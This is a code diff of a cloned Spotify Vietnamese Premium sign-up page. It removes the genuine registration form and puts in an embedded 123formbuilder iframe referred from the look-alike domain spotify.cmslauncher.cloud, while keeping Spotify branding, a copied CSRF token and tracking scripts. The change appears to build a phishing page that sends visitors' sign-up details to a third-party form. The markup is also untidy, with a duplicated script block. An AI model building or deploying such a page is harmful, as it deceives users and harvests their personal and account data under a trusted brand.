@@ -49,8 +49,8 @@
                 
     <title>Đăng ký  - Spotify</title>
 
-          <link rel="icon" href="https://www.scdn.co/i/_global/favicon.png">
-      <!--[if IE]><link rel="shortcut icon" href="https://www.scdn.co/i/_global/favicon.ico"><![endif]-->
+          <link rel="icon" href="favicon.png">
+      <!--[if IE]><link rel="shortcut icon" href="favicon.ico"><![endif]-->
     
           <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.scdn.co/i/_global/touch-icon-144.png">
       <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.scdn.co/i/_global/touch-icon-114.png">
@@ -202,21 +202,18 @@ spweb.config = {
     </section>
             
         <section class="register">
-    <div class="content">
-        <h2 class="center hdr-l">Đăng ký mua Spotify Premium</h2>
-        <form id="js-register-with-email" method="post" action="action_page.php">
-<!-- www.123formbuilder.com script begins here --><script type="text/javascript" defer src="//www.123formbuilder.com/embed/4289337.js" data-role="form" data-default-width="650px"></script><!-- www.123formbuilder.com script ends here -->
-    <input type="hidden" id="signup_form_data_source" name="signup_form[data_source]" value="www" />
+<!-- www.123formbuilder.com script begins here --><iframe id="1538571358689_757105015670227" src="//www.123formbuilder.com/js-form-username-4289337.html?ref=http%3A%2F%2Fspotify.cmslauncher.cloud%2FSignup%2F&amp;_referrer_=&amp;_embedType_=embed.js&amp;_iframeID_=1538571358689_757105015670227" frameborder="0" scrolling="no" style="padding: 0px; margin: 0px; display: block; width: 100%; background-color: transparent; overflow: hidden; height: 1008.1875px;"></iframe><!-- www.123formbuilder.com script ends here -->
+    <input type="hidden" id="signup_form_data_source" name="signup_form[data_source]" value="www">
 
-  <div class="js-general-error alert alert-info hidden" data-error="Ối! Đã có sự cố xảy ra, vui lòng thử lại hoặc xem qua &lt;a href=&quot;/help/&quot;&gt;khu vực trợ giúp thử nghiệm của chúng tôi&lt;/a&gt;"></div>
+  <div class="js-general-error alert alert-info hidden" data-error="Ối! Đã có sự cố xảy ra, vui lòng thử lại hoặc xem qua <a href=&quot;/help/&quot;>khu vực trợ giúp thử nghiệm của chúng tôi</a>"></div>
 
-    <input type="hidden" id="signup_form_sp_csrf" name="signup_form[sp_csrf]" value="eyJ0aW1lIjoxNTM4NDcxMzc5LCJoYXNoIjoiZjE2OTIxMmY0YzFkZDE5MWJjODBkNzg2ZGRlYmU5NTM2N2M1YTY2NGRiNWU1MGEwMjYwNmI5NDZhN2I4NTlmNyJ9" />
+    <input type="hidden" id="signup_form_sp_csrf" name="signup_form[sp_csrf]" value="eyJ0aW1lIjoxNTM4NDcxMzc5LCJoYXNoIjoiZjE2OTIxMmY0YzFkZDE5MWJjODBkNzg2ZGRlYmU5NTM2N2M1YTY2NGRiNWU1MGEwMjYwNmI5NDZhN2I4NTlmNyJ9">
 
-    <input type="hidden" id="signup_form_creation_flow" name="signup_form[creation_flow]" />
+    <input type="hidden" id="signup_form_creation_flow" name="signup_form[creation_flow]">
 
-    <input type="hidden" id="forward-url-parameter" name="signup_form[forward_url_parameter]" />
+    <input type="hidden" id="forward-url-parameter" name="signup_form[forward_url_parameter]">
 
-  <input type="hidden" id="register-pre-tick-eula" name="signup_form[signup_pre_tick_eula]" value="true" />
+  <input type="hidden" id="register-pre-tick-eula" name="signup_form[signup_pre_tick_eula]" value="true">
 
   
          <script src="https://www.scdn.co/webpack/spweb-site.min.de1478116dbfa09757a7.js"></script>
@@ -245,7 +242,44 @@ spweb.config = {
         fjs.parentNode.insertBefore(js, fjs);
     }(document, 'script', 'facebook-jssdk'));
   </script>
+    <script async="" src="https://vt.myvisualiq.net/2/afTxMmlGwCNRJiC5Bd75ug==/vt-150.js"></script>
+<!-- This page was rendered using Twig -->
+
+
+</form>
+    
+<script type="text/javascript" src="//cdn-main1.myfor.ms//modules/Typescript/Form/vendor/JQuery/jquery-3.2.1.js.minified.js?d91fadab40"></script>
+
+<script type="text/javascript" src="//cdn-main2.myfor.ms//modules/captainform/js/iframe_resizer/3.6/iframeResizer.contentWindow.min.js.minified.js?d91fadab40"></script>
+
+<script type="text/javascript" src="//www.123formbuilder.com//libraries/perfect-scrollbar/js/perfect-scrollbar.jquery.js.minified.js?d91fadab40"></script>
+
+<script type="text/javascript" src="//cdn-main1.myfor.ms//modules/Typescript/Form/build.js.minified.js?d91fadab40"></script>
+
+    
+  <script>
+    $(function() {
+      spweb.register.init();
+    });
+
+    window.fbAsyncInit = function() {
+      FB.init({
+        appId: spweb.config.facebook.appId,
+        status: true,
+        xfbml: true,
+        oauth: true,
+        version: spweb.config.facebook.version
+      });
+    };
+
+    (function(d, s, id){
+        var js, fjs = d.getElementsByTagName(s)[0];
+        if (d.getElementById(id)) {return;}
+        js = d.createElement(s); js.id = id;
+        js.src = "https://connect.facebook.net/" + spweb.config.facebook.locale + "/sdk.js";
+        fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));
+  </script>
     <script async src="https://vt.myvisualiq.net/2/afTxMmlGwCNRJiC5Bd75ug==/vt-150.js"></script></body>
 <!-- This page was rendered using Twig -->
 </html>
-
